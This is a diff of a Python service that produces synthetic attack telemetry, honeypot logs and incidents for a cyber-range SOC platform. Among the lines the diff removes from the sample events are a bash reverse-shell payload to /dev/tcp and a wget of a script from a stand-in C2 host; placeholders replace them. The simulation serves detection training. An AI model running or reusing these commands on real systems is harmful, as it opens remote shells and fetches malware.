@@ -1,28 +1,28 @@
-"""
-Flagship Attack Simulator Service for SanitialX Cyber Range.
-
-Generates realistic, correlated telemetry events inside an isolated cyber range,
-triggers honeypot interaction logs, creates incidents, builds attack graphs,
-and generates AI reasoning reports.
-"""
+"""Controlled attack simulation service for the SanitialX Cyber Range."""
 
 from __future__ import annotations
 
 import uuid
-from datetime import datetime, timezone, timedelta
+from datetime import datetime, timedelta, timezone
 from typing import Any
 
 from sqlalchemy.ext.asyncio import AsyncSession
-from db.repositories.event_repository import PostgresEventRepository
+
+from correlation.enums import Severity
 from db.repositories.agent_repository import PostgresAgentRepository
+from db.repositories.event_repository import PostgresEventRepository
 from db.repositories.honeypot_repository import PostgresHoneypotRepository
-from db.repositories.simulation_repository import PostgresSimulationRepository
 from db.repositories.incident_repository import PostgresIncidentRepository
-from incidents.models import Incident
+from db.repositories.rule_repository import PostgresDetectionRuleRepository
+from db.repositories.simulation_repository import PostgresSimulationRepository
 from incidents.enums import IncidentStatus
+from incidents.models import Incident
+from simulation.scenarios import get_scenario
 
 
 class AttackSimulatorService:
+    """Generate correlated synthetic telemetry without touching real systems."""
+
     def __init__(self, session: AsyncSession) -> None:
         self._session = session
         self.event_repo = PostgresEventRepository(session)
@@ -30,279 +30,230 @@ class AttackSimulatorService:
         self.honeypot_repo = PostgresHoneypotRepository(session)
         self.simulation_repo = PostgresSimulationRepository(session)
         self.incident_repo = PostgresIncidentRepository(session)
+        self.rule_repo = PostgresDetectionRuleRepository(session)
 
     async def run_scenario(self, scenario_name: str = "WEB_APP_COMPROMISE") -> dict[str, Any]:
-        """Execute a simulated attack scenario and generate end-to-end telemetry."""
+        """Run a registered scenario and honor persisted detection-rule state."""
+        scenario = get_scenario(scenario_name)
         sim_id = f"SIM-{uuid.uuid4().hex[:8].upper()}"
-        inc_id = f"INC-{datetime.now().year}-{uuid.uuid4().hex[:4].upper()}"
+        now = datetime.now(timezone.utc)
+        timestamps = [now - timedelta(seconds=180 - i * 20) for i in range(9)]
+
         attacker_ip = "10.0.0.21"
         target_web_ip = "10.0.0.50"
         target_db_ip = "10.0.0.88"
+        honeypot_ip = "10.0.0.99"
         c2_ip = "198.51.100.42"
 
-        now = datetime.now(timezone.utc)
-        timestamps = [now - timedelta(seconds=180 - i * 20) for i in range(10)]
+        await self._upsert_agents(now, target_web_ip, target_db_ip, honeypot_ip)
 
-        # 1. Generate Agents Telemetry
-        await self.agent_repo.upsert_agent({
-            "agent_id": "agent-web-01",
-            "hostname": "web-prod-frontend-01",
-            "ip_address": target_web_ip,
-            "os": "Ubuntu 22.04 LTS (Linux)",
-            "status": "COMPROMISED",
-            "last_seen": now,
-            "cpu_usage": 78.4,
-            "memory_usage": 64.2,
-            "risk_score": 92,
-            "events_count": 142,
-        })
-        await self.agent_repo.upsert_agent({
-            "agent_id": "agent-db-01",
-            "hostname": "db-internal-cluster-01",
-            "ip_address": target_db_ip,
-            "os": "Debian 12 Bookworm (Linux)",
-            "status": "WARNING",
-            "last_seen": now,
-            "cpu_usage": 42.1,
-            "memory_usage": 55.0,
-            "risk_score": 68,
-            "events_count": 89,
-        })
-        await self.agent_repo.upsert_agent({
-            "agent_id": "agent-honeypot-01",
-            "hostname": "decoy-ssh-vault",
-            "ip_address": "10.0.0.99",
-            "os": "Alpine Linux (Deception Node)",
-            "status": "ONLINE",
-            "last_seen": now,
-            "cpu_usage": 12.0,
-            "memory_usage": 22.5,
-            "risk_score": 85,
-            "events_count": 34,
-        })
-
-        # 2. Generate Sequence of Security Events
-        raw_events_data = [
-            {
-                "event_id": f"EVT-{uuid.uuid4().hex[:8]}",
-                "timestamp": timestamps[0],
-                "event_type": "RECONNAISSANCE_PORT_SCAN",
-                "severity": "MEDIUM",
-                "source_ip": attacker_ip,
-                "destination_ip": target_web_ip,
-                "user": "anonymous",
-                "host": "web-prod-frontend-01",
-                "rule_id": "RULE-RCON-01",
-                "mitre_technique": "T1046",
-                "details": "Port scan detected targeting ports 80, 443, 22, 3306, 8080.",
-                "raw_payload": {"ports_scanned": [80, 443, 22, 3306, 8080], "scanner": "nmap"},
-            },
-            {
-                "event_id": f"EVT-{uuid.uuid4().hex[:8]}",
-                "timestamp": timestamps[1],
-                "event_type": "AUTH_FAILED_BRUTE_FORCE",
-                "severity": "MEDIUM",
-                "source_ip": attacker_ip,
-                "destination_ip": target_web_ip,
-                "user": "admin",
-                "host": "web-prod-frontend-01",
-                "rule_id": "RULE-AUTH-01",
-                "mitre_technique": "T1110.001",
-                "details": "Multiple failed authentication attempts on HTTP POST /login (14 failures in 30s).",
-                "raw_payload": {"failed_attempts": 14, "target_uri": "/api/v1/auth/login"},
-            },
-            {
-                "event_id": f"EVT-{uuid.uuid4().hex[:8]}",
-                "timestamp": timestamps[2],
-                "event_type": "AUTH_SUCCESSFUL_COMPROMISE",
-                "severity": "HIGH",
-                "source_ip": attacker_ip,
-                "destination_ip": target_web_ip,
-                "user": "sysadmin_backup",
-                "host": "web-prod-frontend-01",
-                "rule_id": "RULE-AUTH-02",
-                "mitre_technique": "T1078.003",
-                "details": "Successful login for user sysadmin_backup following brute force series.",
-                "raw_payload": {"session_token": "bearer_temp_xyz123"},
-            },
-            {
-                "event_id": f"EVT-{uuid.uuid4().hex[:8]}",
-                "timestamp": timestamps[3],
-                "event_type": "COMMAND_INJECTION_DETECTED",
-                "severity": "CRITICAL",
-                "source_ip": attacker_ip,
-                "destination_ip": target_web_ip,
-                "user": "www-data",
-                "host": "web-prod-frontend-01",
-                "rule_id": "RULE-EXPLOIT-01",
-                "mitre_technique": "T1059.004",
-                "details": "Web shell / command injection parameter detected in HTTP POST request: ; /bin/bash -c ...",
-                "raw_payload": {"payload": "; bash -i >& /dev/tcp/10.0.0.21/4444 0>&1"},
-            },
-            {
-                "event_id": f"EVT-{uuid.uuid4().hex[:8]}",
-                "timestamp": timestamps[4],
-                "event_type": "SSH_SESSION_ESTABLISHED",
-                "severity": "HIGH",
-                "source_ip": attacker_ip,
-                "destination_ip": target_web_ip,
-                "user": "sysadmin_backup",
-                "host": "web-prod-frontend-01",
-                "rule_id": "RULE-NET-01",
-                "mitre_technique": "T1021.004",
-                "details": "Interactive SSH session opened from attacker IP using stolen SSH key.",
-                "raw_payload": {"ssh_key_fingerprint": "SHA256:7b92f..."},
-            },
-            {
-                "event_id": f"EVT-{uuid.uuid4().hex[:8]}",
-                "timestamp": timestamps[5],
-                "event_type": "HONEYPOT_DECEIVE_INTERACTION",
-                "severity": "CRITICAL",
-                "source_ip": attacker_ip,
-                "destination_ip": "10.0.0.99",
-                "user": "root",
-                "host": "decoy-ssh-vault",
-                "rule_id": "RULE-DECEP-01",
-                "mitre_technique": "T1087.002",
-                "details": "Attacker interacted with SSH Honeypot Decoy service and downloaded fake credential file `/var/www/.env.honeypot`.",
-                "raw_payload": {"honeypot_id": "SSH-VAULT-01", "decoy_file": "/var/www/.env.honeypot"},
-            },
-            {
-                "event_id": f"EVT-{uuid.uuid4().hex[:8]}",
-                "timestamp": timestamps[6],
-                "event_type": "PRIVILEGE_ESCALATION_SUID",
-                "severity": "CRITICAL",
-                "source_ip": attacker_ip,
-                "destination_ip": target_web_ip,
-                "user": "root",
-                "host": "web-prod-frontend-01",
-                "rule_id": "RULE-PRIV-01",
-                "mitre_technique": "T1548.001",
-                "details": "Privilege escalation to root verified via SUID binary binary_helper exploitation.",
-                "raw_payload": {"binary": "/usr/local/bin/binary_helper", "effective_uid": 0},
-            },
-            {
-                "event_id": f"EVT-{uuid.uuid4().hex[:8]}",
-                "timestamp": timestamps[7],
-                "event_type": "DATABASE_SENSITIVE_READ",
-                "severity": "CRITICAL",
-                "source_ip": target_web_ip,
-                "destination_ip": target_db_ip,
-                "user": "db_master_admin",
-                "host": "db-internal-cluster-01",
-                "rule_id": "RULE-DATA-01",
-                "mitre_technique": "T1005",
-                "details": "SQL query executed reading customer_records table and downloading customer_db_dump.sql.",
-                "raw_payload": {"tables": ["customer_records", "payment_vault"], "rows_returned": 24500},
-            },
-            {
-                "event_id": f"EVT-{uuid.uuid4().hex[:8]}",
-                "timestamp": timestamps[8],
-                "event_type": "OUTBOUND_EXFILTRATION_DETECTED",
-                "severity": "CRITICAL",
-                "source_ip": target_web_ip,
-                "destination_ip": c2_ip,
-                "user": "root",
-                "host": "web-prod-frontend-01",
-                "rule_id": "RULE-EXFIL-01",
-                "mitre_technique": "T1041",
-                "details": "Simulated encrypted outbound data transfer (48.2 MB) sent to known C2 server IP.",
-                "raw_payload": {"bytes_sent": 50541280, "c2_ip": c2_ip, "port": 8443},
-            },
+        events = [
+            self._event(
+                timestamps[0], "RECONNAISSANCE_PORT_SCAN", "MEDIUM", attacker_ip, target_web_ip,
+                "anonymous", "web-prod-frontend-01", "RULE-RCON-01", "T1046",
+                "Port scan detected targeting ports 80, 443, 22, 3306, 8080.",
+                {"ports_scanned": [80, 443, 22, 3306, 8080], "scanner": "synthetic-nmap"}, sim_id,
+            ),
+            self._event(
+                timestamps[1], "AUTH_FAILED_BRUTE_FORCE", "MEDIUM", attacker_ip, target_web_ip,
+                "admin", "web-prod-frontend-01", "RULE-AUTH-01", "T1110.001",
+                "Multiple failed authentication attempts on HTTP POST /login (14 failures in 30s).",
+                {"failed_attempts": 14, "target_uri": "/api/v1/auth/login"}, sim_id,
+            ),
+            self._event(
+                timestamps[2], "AUTH_SUCCESSFUL_COMPROMISE", "HIGH", attacker_ip, target_web_ip,
+                "sysadmin_backup", "web-prod-frontend-01", "RULE-AUTH-02", "T1078.003",
+                "Successful login for synthetic account sysadmin_backup following brute force series.",
+                {"session_token": "SIMULATED_SESSION_TOKEN"}, sim_id,
+            ),
+            self._event(
+                timestamps[3], "COMMAND_INJECTION_DETECTED", "CRITICAL", attacker_ip, target_web_ip,
+                "www-data", "web-prod-frontend-01", "RULE-EXPLOIT-01", "T1059.004",
+                "Synthetic command-injection payload detected in an HTTP request.",
+                {"payload": "SIMULATED_COMMAND_INJECTION"}, sim_id,
+            ),
+            self._event(
+                timestamps[4], "SSH_SESSION_ESTABLISHED", "HIGH", attacker_ip, target_web_ip,
+                "sysadmin_backup", "web-prod-frontend-01", "RULE-NET-01", "T1021.004",
+                "Synthetic interactive SSH session opened using a simulated stolen key.",
+                {"ssh_key_fingerprint": "SIMULATED_FINGERPRINT"}, sim_id,
+            ),
+            self._event(
+                timestamps[5], "HONEYPOT_DECEIVE_INTERACTION", "CRITICAL", attacker_ip, honeypot_ip,
+                "root", "decoy-ssh-vault", "RULE-DECEP-01", "T1087.002",
+                "Synthetic attacker interaction with the SSH deception node and decoy credential file.",
+                {"honeypot_id": "SSH-VAULT-01", "decoy_file": "/var/www/.env.honeypot"}, sim_id,
+            ),
+            self._event(
+                timestamps[6], "PRIVILEGE_ESCALATION_SUID", "CRITICAL", attacker_ip, target_web_ip,
+                "root", "web-prod-frontend-01", "RULE-PRIV-01", "T1548.001",
+                "Synthetic privilege escalation to root through a vulnerable SUID helper.",
+                {"binary": "/usr/local/bin/binary_helper", "effective_uid": 0}, sim_id,
+            ),
+            self._event(
+                timestamps[7], "DATABASE_SENSITIVE_READ", "CRITICAL", target_web_ip, target_db_ip,
+                "db_master_admin", "db-internal-cluster-01", "RULE-DATA-01", "T1005",
+                "Synthetic SQL read of protected customer data from the simulated database.",
+                {"tables": ["customer_records", "payment_vault"], "rows_returned": 24500}, sim_id,
+            ),
+            self._event(
+                timestamps[8], "OUTBOUND_EXFILTRATION_DETECTED", "CRITICAL", target_web_ip, c2_ip,
+                "root", "web-prod-frontend-01", "RULE-EXFIL-01", "T1041",
+                "Synthetic encrypted outbound transfer of simulated data to a documentation-only C2 address.",
+                {"bytes_sent": 50541280, "c2_ip": c2_ip, "port": 8443}, sim_id,
+            ),
         ]
 
-        for evt in raw_events_data:
-            await self.event_repo.add_event(evt)
+        selected = [events[i] for i in scenario.event_indexes]
+        emitted: list[dict[str, Any]] = []
+        disabled_rules: list[str] = []
 
-        # 3. Create Honeypot Session
-        await self.honeypot_repo.add_session({
-            "session_id": f"HONEY-{uuid.uuid4().hex[:6]}",
-            "attacker_ip": attacker_ip,
-            "service": "SSH Honeypot & Fake Vault",
-            "started_at": timestamps[5],
-            "ended_at": timestamps[8],
-            "duration_seconds": 134,
-            "credentials_attempted": ["admin", "root", "sysadmin_backup", "postgres"],
-            "commands_executed": ["whoami", "uname -a", "cat /var/www/.env.honeypot", "wget http://c2.server/mal.sh"],
-            "files_accessed": ["/var/www/.env.honeypot", "/root/decoy_keys.pem"],
-            "risk_score": 95,
-            "notes": "Attacker trapped in Alpine isolation honeypot container. High-value deception metrics gathered.",
-        })
+        for event in selected:
+            rule = await self.rule_repo.get_rule(event["rule_id"])
+            if rule is not None and not rule["enabled"]:
+                disabled_rules.append(event["rule_id"])
+                continue
+            if rule is not None and rule.get("severity"):
+                event["severity"] = rule["severity"]
+            event["details"] = f"[{scenario.name}] {event['details']}"
+            await self.event_repo.add_event(event)
+            emitted.append(event)
 
-        # 4. Construct Attack Graph Nodes & AI Investigation Data
-        attack_graph_nodes = [
-            {"id": "node-1", "label": "Attacker (10.0.0.21)", "type": "attacker", "status": "active", "timestamp": timestamps[0].isoformat(), "details": "Scanned target ports & initiated brute force"},
-            {"id": "node-2", "label": "Web App (10.0.0.50)", "type": "asset", "status": "compromised", "timestamp": timestamps[2].isoformat(), "details": "Authentication bypassed via credential reuse"},
-            {"id": "node-3", "label": "SSH Service", "type": "service", "status": "compromised", "timestamp": timestamps[4].isoformat(), "details": "Interactive shell opened"},
-            {"id": "node-4", "label": "Honeypot Decoy (10.0.0.99)", "type": "deception", "status": "triggered", "timestamp": timestamps[5].isoformat(), "details": "Downloaded decoy secrets file"},
-            {"id": "node-5", "label": "Root Escalation", "type": "exploit", "status": "escalated", "timestamp": timestamps[6].isoformat(), "details": "Exploited SUID helper binary"},
-            {"id": "node-6", "label": "Fake Database (10.0.0.88)", "type": "asset", "status": "accessed", "timestamp": timestamps[7].isoformat(), "details": "Extracted 24,500 customer records"},
-            {"id": "node-7", "label": "External C2 (198.51.100.42)", "type": "exfiltration", "status": "exfiltrated", "timestamp": timestamps[8].isoformat(), "details": "Simulated 48.2 MB transfer"},
-        ]
+        if any(e["event_type"] == "HONEYPOT_DECEIVE_INTERACTION" for e in emitted):
+            await self.honeypot_repo.add_session({
+                "session_id": f"HONEY-{uuid.uuid4().hex[:6].upper()}",
+                "attacker_ip": attacker_ip,
+                "service": "SSH Honeypot & Fake Vault",
+                "started_at": timestamps[5],
+                "ended_at": timestamps[8],
+                "duration_seconds": 134,
+                "credentials_attempted": ["admin", "root", "sysadmin_backup", "postgres"],
+                "commands_executed": ["whoami", "uname -a", "cat /var/www/.env.honeypot"],
+                "files_accessed": ["/var/www/.env.honeypot", "/root/decoy_keys.pem"],
+                "risk_score": 95,
+                "notes": f"Simulation {sim_id}: attacker trapped in isolated deception node.",
+            })
 
-        attack_graph_edges = [
-            {"source": "node-1", "target": "node-2", "label": "T1110 Brute Force"},
-            {"source": "node-2", "target": "node-3", "label": "T1021 SSH Shell"},
-            {"source": "node-3", "target": "node-4", "label": "T1087 Honeypot Access"},
-            {"source": "node-3", "target": "node-5", "label": "T1548 SUID Escalation"},
-            {"source": "node-5", "target": "node-6", "label": "T1005 DB Access"},
-            {"source": "node-6", "target": "node-7", "label": "T1041 Exfiltration"},
-        ]
+        triggering_ids = list(dict.fromkeys(e["rule_id"] for e in emitted if e["severity"] in {"HIGH", "CRITICAL"}))
+        incident_id: str | None = None
+        graph_nodes, graph_edges = self._build_graph(emitted)
 
-        ai_reasoning = {
-            "executive_summary": "SanitialX correlation engine detected a full-chain cyber attack targeting the production Web Application. The attacker gained initial access via automated credential brute-forcing, escalated privileges to root, interacted with deception honeypots, and attempted exfiltration of 24,500 simulated customer records.",
-            "initial_access_vector": "T1110.001 - Brute Force attack originating from external IP 10.0.0.21 against HTTP /login.",
-            "affected_assets": ["web-prod-frontend-01 (10.0.0.50)", "db-internal-cluster-01 (10.0.0.88)", "decoy-ssh-vault (10.0.0.99)"],
-            "observed_techniques": ["T1046 (Network Service Scanning)", "T1110 (Brute Force)", "T1078 (Valid Accounts)", "T1059 (Command Injection)", "T1021 (SSH Remote Services)", "T1087 (Honeypot Account Discovery)", "T1548 (SUID Privilege Escalation)", "T1005 (Data from Local System)", "T1041 (Exfiltration Over C2)"],
-            "honeypot_engagement": "Attacker successfully trapped in SSH Deception Node (10.0.0.99) for 134 seconds, revealing C2 IP 198.51.100.42 and credential harvest vectors.",
-            "simulated_data_loss": "24,500 customer records in simulated database table customer_records.",
-            "overall_risk_score": 96,
-            "recommended_actions": [
-                "1. Immediately block malicious source IP 10.0.0.21 and C2 IP 198.51.100.42 on perimeter firewall.",
-                "2. Revoke and rotate SSH keys and credentials for user sysadmin_backup.",
-                "3. Isolate host web-prod-frontend-01 for forensic image capture.",
-                "4. Patch SUID binary /usr/local/bin/binary_helper permission vulnerability.",
-                "5. Enable multi-factor authentication (MFA) on all SOC administrative web portals.",
-            ],
-            "graph_nodes": attack_graph_nodes,
-            "graph_edges": attack_graph_edges,
-        }
+        if triggering_ids:
+            incident_id = f"INC-{now.year}-{uuid.uuid4().hex[:4].upper()}"
+            incident_severity = max(
+                (Severity(e["severity"]) for e in emitted),
+                key=lambda value: {Severity.LOW: 1, Severity.MEDIUM: 2, Severity.HIGH: 3, Severity.CRITICAL: 4}[value],
+            )
+            incident = Incident(
+                incident_id=incident_id,
+                title=scenario.title,
+                description=scenario.description,
+                severity=incident_severity,
+                status=IncidentStatus.OPEN,
+                version=1,
+                created_at=now,
+                updated_at=now,
+                source_ip=attacker_ip,
+                destination_ip=target_web_ip,
+                triggering_detection_ids=triggering_ids,
+                context={
+                    "simulation_id": sim_id,
+                    "scenario": scenario.name,
+                    "overall_risk_score": 96 if incident_severity == Severity.CRITICAL else 78,
+                    "disabled_rules": disabled_rules,
+                    "simulated_data_loss": "24,500 customer records" if any(e["event_type"] == "DATABASE_SENSITIVE_READ" for e in emitted) else "None",
+                    "graph_nodes": graph_nodes,
+                    "graph_edges": graph_edges,
+                    "observed_techniques": list(dict.fromkeys(e["mitre_technique"] for e in emitted)),
+                },
+            )
+            created_inc = await self.incident_repo.create(incident)
+            incident_id = created_inc.incident_id
 
-        # 5. Create or Update Incident
-        incident_obj = Incident(
-            incident_id=inc_id,
-            title="Web Application Compromise & Data Exfiltration",
-            description="Full-chain attack simulation: Recon -> Brute Force -> Shell -> Honeypot -> Priv Esc -> Data Access -> Exfiltration",
-            severity="CRITICAL",
-            status=IncidentStatus.OPEN,
-            version=1,
-            created_at=now,
-            updated_at=now,
-            source_ip=attacker_ip,
-            destination_ip=target_web_ip,
-            triggering_detection_ids=["RULE-EXPLOIT-01", "RULE-PRIV-01", "RULE-EXFIL-01"],
-            context=ai_reasoning,
-        )
-
-        created_inc = await self.incident_repo.create(incident_obj)
-
-        # 6. Save Simulation Record
         sim_model = await self.simulation_repo.add_simulation({
             "simulation_id": sim_id,
-            "scenario_name": scenario_name,
+            "scenario_name": scenario.name,
             "target_environment": "SanitialX Cyber Range",
-            "difficulty": "Intermediate",
+            "difficulty": scenario.difficulty,
             "status": "COMPLETED",
             "started_at": timestamps[0],
             "completed_at": now,
-            "generated_incident_id": created_inc.incident_id,
-            "events_generated": len(raw_events_data),
+            "generated_incident_id": incident_id,
+            "events_generated": len(emitted),
             "details": {
                 "attacker_ip": attacker_ip,
                 "victim_ip": target_web_ip,
-                "honeypot_triggered": True,
-                "incident_created": created_inc.incident_id,
+                "events_requested": len(selected),
+                "events_emitted": len(emitted),
+                "disabled_rules": disabled_rules,
+                "incident_created": incident_id is not None,
+                "rule_engine_applied": True,
             },
         })
-
         return sim_model.to_dict()
+
+    async def _upsert_agents(self, now: datetime, web_ip: str, db_ip: str, honeypot_ip: str) -> None:
+        agents = [
+            ("agent-web-01", "web-prod-frontend-01", web_ip, "Ubuntu 22.04 LTS (Linux)", "COMPROMISED", 78.4, 64.2, 92, 142),
+            ("agent-db-01", "db-internal-cluster-01", db_ip, "Debian 12 Bookworm (Linux)", "WARNING", 42.1, 55.0, 68, 89),
+            ("agent-honeypot-01", "decoy-ssh-vault", honeypot_ip, "Alpine Linux (Deception Node)", "ONLINE", 12.0, 22.5, 85, 34),
+        ]
+        for agent_id, hostname, ip, os_name, status, cpu, memory, risk, count in agents:
+            await self.agent_repo.upsert_agent({
+                "agent_id": agent_id,
+                "hostname": hostname,
+                "ip_address": ip,
+                "os": os_name,
+                "status": status,
+                "last_seen": now,
+                "cpu_usage": cpu,
+                "memory_usage": memory,
+                "risk_score": risk,
+                "events_count": count,
+            })
+
+    @staticmethod
+    def _event(
+        timestamp: datetime, event_type: str, severity: str, source_ip: str, destination_ip: str,
+        user: str, host: str, rule_id: str, mitre: str, details: str,
+        raw_payload: dict[str, Any], simulation_id: str,
+    ) -> dict[str, Any]:
+        return {
+            "event_id": f"EVT-{uuid.uuid4().hex[:8].upper()}",
+            "timestamp": timestamp,
+            "event_type": event_type,
+            "severity": severity,
+            "source_ip": source_ip,
+            "destination_ip": destination_ip,
+            "user": user,
+            "host": host,
+            "rule_id": rule_id,
+            "mitre_technique": mitre,
+            "details": details,
+            "raw_payload": {**raw_payload, "simulation_id": simulation_id},
+        }
+
+    @staticmethod
+    def _build_graph(events: list[dict[str, Any]]) -> tuple[list[dict[str, Any]], list[dict[str, Any]]]:
+        nodes: list[dict[str, Any]] = []
+        edges: list[dict[str, Any]] = []
+        seen: dict[str, str] = {}
+        for index, event in enumerate(events, start=1):
+            for ip, node_type in ((event["source_ip"], "source"), (event["destination_ip"], "asset")):
+                if not ip or ip in seen:
+                    continue
+                node_id = f"node-{len(nodes) + 1}"
+                seen[ip] = node_id
+                nodes.append({
+                    "id": node_id,
+                    "label": ip,
+                    "type": "attacker" if ip.startswith("10.0.0.21") else node_type,
+                    "status": "active" if node_type == "source" else "affected",
+                    "timestamp": event["timestamp"].isoformat(),
+                    "details": event["event_type"],
+                })
+            source_id = seen.get(event["source_ip"])
+            target_id = seen.get(event["destination_ip"])
+            if source_id and target_id:
+                edges.append({"source": source_id, "target": target_id, "label": event["mitre_technique"]})
+        return nodes, edges
